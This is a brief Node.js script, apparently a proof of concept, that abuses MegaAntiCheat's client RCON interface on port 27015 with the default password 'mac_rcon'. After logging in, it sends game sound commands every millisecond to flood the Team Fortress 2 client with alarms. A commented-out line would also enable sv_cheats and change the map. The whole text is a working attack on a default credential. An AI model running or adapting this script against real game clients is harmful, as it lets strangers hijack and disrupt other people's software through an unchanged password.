//MegaAntiCheat uses client RCON on port 27015 and default password is mac_rcon. What can go wrong.
const Rcon = require('rcon-srcds').default;
const server = new Rcon({host: '127.0.0.1', port: 27015});
server.authenticate('mac_rcon')
    .then(() => {
        //server.execute('sv_cheats 1;map itemtest;r_rootlod 10');
        require('events').EventEmitter.defaultMaxListeners = 0; //disable node memleak prompt
        setInterval(() => {server.execute('play mvm/mvm_cpoint_klaxon;playgamesound Game.HappyBirthdayNoiseMaker;playgamesound mvm.cpoint_alarm')}, 1);
    })
    .then(console.log)
    .catch(console.error);
